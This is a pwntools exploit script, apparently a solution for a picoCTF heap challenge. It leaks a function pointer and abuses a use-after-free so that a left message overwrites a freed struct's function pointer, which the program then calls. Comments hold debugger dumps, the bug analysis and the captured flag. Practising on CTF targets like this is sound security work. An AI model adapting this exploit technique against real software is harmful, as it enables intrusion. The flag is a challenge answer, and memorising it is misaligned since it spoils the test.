from pwn import *


local_bin = "./self_compile"
elf = ELF(local_bin)
rop = ROP(elf)

p = remote("mercury.picoctf.net",4504)
#p = process(local_bin)


#p = gdb.debug(local_bin, '''
	#break start
	#break main
	#break doProcess
	#break *doProcess+24
	#break leaveMessage
	#break *leaveMessage+37
	#break m
	#break *processInput+252
	#break getsline
	#break s
	#break i
	#continue
	#''')


def leaveMessages(message):
	p.clean()
	p.sendline(b'l')
	output = p.recvuntil(b'try anyways')
	#print(output)
	p.send(message)


def makeAccount(username):
	p.sendline(b'M')
	output = p.recvuntil(b'username:')
	#print(output)
	p.sendline(username)

def deleteAccount():
	p.sendline(b'i')
	output = p.recvuntil(b'(Y/N)')
	#print(output)
	p.sendline(b'Y')

def leakFunctionPointer():
	p.sendline(b's')
	output = p.recvuntil(b'...')
	#print(output)
	output = p.recvuntil(b'\n')
	print(output)
	return output


print("[+] Making Account")
output = p.recvuntil(b'(e)xit\n')
#print(output)
makeAccount(b'BBBBBBBB')

output = p.recvuntil(b'(e)xit\n')
print("[+] Leak function pointer")
leak = leakFunctionPointer()
#print("[+] Leaked function pointer = ", leak)
leak_hex = leak[2:-1]
print("[+] Leak hex = ", leak_hex)

leak = int(leak_hex, 16)
print("[+] Leaked function pointer = ", leak)


print("[+] leaving message 2")
output = p.recvuntil(b'(e)xit\n')
#print(output)
leaveMessages(b'aaaaaaaa')

print("[+] leaving message 3")
output = p.recvuntil(b'(e)xit\n')
#print(output)
leaveMessages(b'aaaaaaaa')

print("[+] leaving message 4")
output = p.recvuntil(b'(e)xit\n')
#print(output)
leaveMessages(b'aaaaaaaa')

print("[+] leaving message 5")
output = p.recvuntil(b'(e)xit\n')
#print(output)
leaveMessages(b'aaaaaaaa')

output = p.recvuntil(b'(e)xit\n')
#print(output)
print("[+] Deleting Account")
deleteAccount()

'''
Crash:
 â–º 0x5555555553a0 <doProcess+24>    call   rdx <0xa41414141414141>


Analysis:

After account is deleted, the next message created will enter the space in the username.

1.	
user is initialized at the start
its a pointer to a struct

typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;	

0x5555555580d8 <user>:  0x00005555555592a0      0x0000000000000000
0x5555555580d0 <choice>:0x000000000000006c      0x00005555555592a0

pwndbg> x/20gx 0x00005555555592a0
				whatToDo:
0x5555555592a0: 0x00005555555553e3      0x000055555555a2d0
0x5555555592b0: 0x0000000000000000      0x0000000000001011
0x5555555592c0: 0x4242424242424242      0x000000000000000a

0x00005555555553e3 is a function pointer to a function

when free(user) is called: free(0x5555555592a0)

before:
pwndbg> x/20gx 0x5555555592a0
0x5555555592a0: 0x000055555555543d      0x000055555555a2d0
0x5555555592b0: 0x0000000000000000      0x0000000000001011
0x5555555592c0: 0x4242424242420a59      0x000000000000000a

after:
pwndbg> x/20gx 0x5555555592a0
0x5555555592a0: 0x0000000000000000      0x0000555555559010
0x5555555592b0: 0x0000000000000000      0x0000000000001011
0x5555555592c0: 0x4242424242420a59      0x000000000000000a

after calling account deletion, the next input we enter 'L':

processInput immediately enters to leaveMessage (note that it does not enter doProcess),
So this does not update user->whatToDo, hence the message i leave will enter user->whatToDo
if the size of it is 0x8

subsequently, after processInput,
doProcess is called, (*obj->whatToDo)() is called
whatToDo is pointing to our message from leaveMessage


Flag = picoCTF{d0ubl3_j30p4rdy_4245f637}

'''
#sendFunctionPointer = b''
leak_working = p64(leak, endian='little')
print("[+] leak_working2 = ", leak_working)

#leak_working2 = hex(leak_working)
#print("[+] leak_working2 = ", leak_working2)

#sendFunctionPointer = (leak_hex.decode('utf-8'))
#print("[+] what is my function pointer ", sendFunctionPointer)

#str_leak = str(sendFunctionPointer)

#sendFunctionPointer = bytes.fromhex(str_leak).decode('utf-8')
#print("[+] what is my function pointer ", sendFunctionPointer)

output = p.recvuntil(b'(e)xit\n')
#print(output)
leaveMessages(leak_working)
#leaveMessages(sendFunctionPointer)

#this will trigger the vuln to enter our function
output = p.recvuntil(b'(e)xit\n')
#print(output)
leaveMessages(b'aaaaaaaa')

p.interactive()

'''
output = p.recvuntil(b'(e)xit\n')
print(output)
leaveMessages(b'aaaaaaaa')

print("[+] Deleting Account")
output = p.recvuntil(b'(e)xit\n')
print(output)
deleteAccount()

print("[+] Creating Account")
output = p.recvuntil(b'(e)xit\n')
print(output)
makeAccount(b'BBBBBBBB')


p.interactive()
'''